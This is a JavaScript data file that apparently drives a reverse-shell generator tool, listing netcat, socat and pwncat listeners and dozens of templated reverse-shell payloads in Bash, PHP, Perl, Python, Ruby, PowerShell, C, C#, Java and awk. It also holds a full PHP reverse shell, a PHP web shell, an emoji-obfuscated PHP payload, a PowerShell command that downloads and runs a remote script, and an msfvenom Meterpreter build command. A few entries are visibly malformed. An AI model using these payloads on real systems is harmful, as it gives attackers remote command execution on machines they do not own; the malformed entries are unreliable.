const rsgData = {

    listenerCommands: [
        ['nc', 'nc -lvnp {port}'],
        ['rlwrap + nc', 'rlwrap -cAr nc -lvnp {port}'],
        ['pwncat', 'python3 -m pwncat -lp {port}'],
        ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
        ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
        ['powercat', 'powercat -l -p {port}']
    ],

    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],

    upgrade: ['python', ],

    specialCommands: {
        'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    },

    reverseShellCommands: [
        {
            "name": "Bash -i",
            "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash 196",
            "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash read line",
            "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash 5",
            "command": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash udp",
            "command": "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
            "meta": ["linux", "mac"]
        },
        {
            "name": "C",
            "command": "#include &lt;stdio.h>\n#include &lt;sys/socket.h>\n#include &lt;sys/types.h>\n#include &lt;stdlib.h>\n#include &lt;unistd.h>\n#include &lt;netinet/in.h>\n#include &lt;arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"{shell}\", NULL};\n    execve(\"{shell}\", argv, NULL);\n\n    return 0;       \n}",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "C#",
            "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"10.0.2.15\", 443))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"cmd.exe\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "nc mkfifo",
            "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
            "meta": ["linux", "mac"]
        },
        {
            "name": "nc -e",
            "command": "nc -e {shell} {ip} {port}",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "nc -c",
            "command": "nc -c {shell} {ip} {port}",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "ncat -e",
            "command": "ncat {ip} {port} -e {shell} ",
            "meta": ["linux", "mac"]
        },
        {
            "name": "ncat udp",
            "command": "ncat {ip} {port} -e {shell}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Emoji PHP",
            "command": "php -r '$😀=\"1\";$😁=\"2\";$😅=\"3\";$😆=\"4\";$😉=\"5\";$😊=\"6\";$😎=\"7\";$😍=\"8\";$😚=\"9\";$🙂=\"0\";$🤢=\" \";$🤓=\"<\";$🤠=\">\";$😱=\"-\";$😵=\"&\";$🤩=\"i\";$🤔=\".\";$🤨=\"/\";$🥰=\"a\";$😐=\"b\";$😶=\"i\";$🙄=\"h\";$😂=\"c\";$🤣=\"d\";$😃=\"e\";$😄=\"f\";$😋=\"k\";$😘=\"n\";$😗=\"o\";$😙=\"p\";$🤗=\"s\";$😑=\"x\";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = \"{ip}\";$💻 = {port};$🐚 = \"{shell}\". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "Perl",
            "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "Perl no sh",
            "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{port}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP PentestMonkey",
            "command": "&lt;?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{ip}';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; {shell} -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit(\"ERROR: Can't fork\");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit(\"Error: Can't setsid()\");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(\"$errstr ($errno)\");\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 =&gt; array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 =&gt; array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 =&gt; array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(\"ERROR: Can't spawn shell\");\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit(\"ERROR: Shell connection terminated\");\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit(\"ERROR: Shell process terminated\");\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(\"SOCK READ\");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(\"SOCK: $input\");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(\"STDOUT READ\");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(\"STDOUT: $input\");\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(\"STDERR READ\");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(\"STDERR: $input\");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint \"$string\\n\";\n\t}\n}\n\n?&gt;",
            "meta": ["linux", "windows", "mac"]
        },
        {
            // fix
            "name": "PHP cmd",
            "command": "&lt;html&gt;\n&lt;body&gt;\n&lt;form method=\"GET\" name=\"&lt;?php echo basename($_SERVER[\'PHP_SELF\']); ?&gt;\"&gt;\n&lt;input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\"&gt;\n&lt;input type=\"SUBMIT\" value=\"Execute\"&gt;\n&lt;\/form&gt;\n&lt;pre&gt;\n&lt;?php\n    if(isset($_GET[\'cmd\']))\n    {\n        system($_GET[\'cmd\']);\n    }\n?&gt;\n&lt;\/pre&gt;\n&lt;\/body&gt;\n&lt;script&gt;document.getElementById(\"cmd\").focus();&lt;\/script&gt;\n&lt;\/html&gt;",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP exec",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
            "meta": ["linux",, "mac"]
        },
        {
            "name": "PHP shell_exec",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP system",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP passthru",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP `",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP popen",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "Windows ConPty",
            "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
            "meta": []
        },
        {
            "name": "PowerShell #1",
            "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
            "meta": []
        },
        {
            "name": "PowerShell #2",
            "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "meta": []
        },
        {
            "name": "PowerShell #3 (Base64)",
            "meta": []
        },
        {
            "name": "Python #1",
            "command": "export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
            "meta": []
        },
        {
            "name": "Python #2",
            "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
            "meta": []
        },
        {
            "name": "Ruby #1",
            "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'",
            "meta": []
        },
        {
            "name": "Ruby no sh",
            "command": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
            "meta": []
        },
        {
            "name": "socat #1",
            "command": "socat TCP:{ip}:{port} EXEC:{shell}",
            "meta": []
        },
        {
            "name": "socat #2 (TTY)",
            "command": "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
            "meta": []
        },
        {
            "name": "awk",
            "command": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
            "meta": []
        },
        {
            "name": "node.js",
            "command": "require('child_process').exec('nc -e {shell} {ip} {port}')",
            "meta": []
        },
        {
            "name": "Java #1",
            "command": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class shell {\n    public static void main(String args[]) {\n        String s;\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
            "meta": []
        },
        {
            "name": "Haskell #1",
            "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"",
            "meta": []
        },
        {
            "name": "telnet",
            "command": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
            "meta": []
        },
        {
            // testing.. need to move into MSFVenom. Another aray...?
            "name": "Windows Meterpreter Staged Reverse TCP",
            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
            "meta": ["msfvenom", "windows", "meterpreter", "reverse"]
        },
    ],

    // msfvenom: [{
    //         "name": "Windows Meterpreter Staged Reverse TCP",
    //         "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={port} -f exe > reverse.exe",
    //         "meta": ["msfvenom", "windows", "meterpreter", "reverse"]
    //     },

    // ],

}
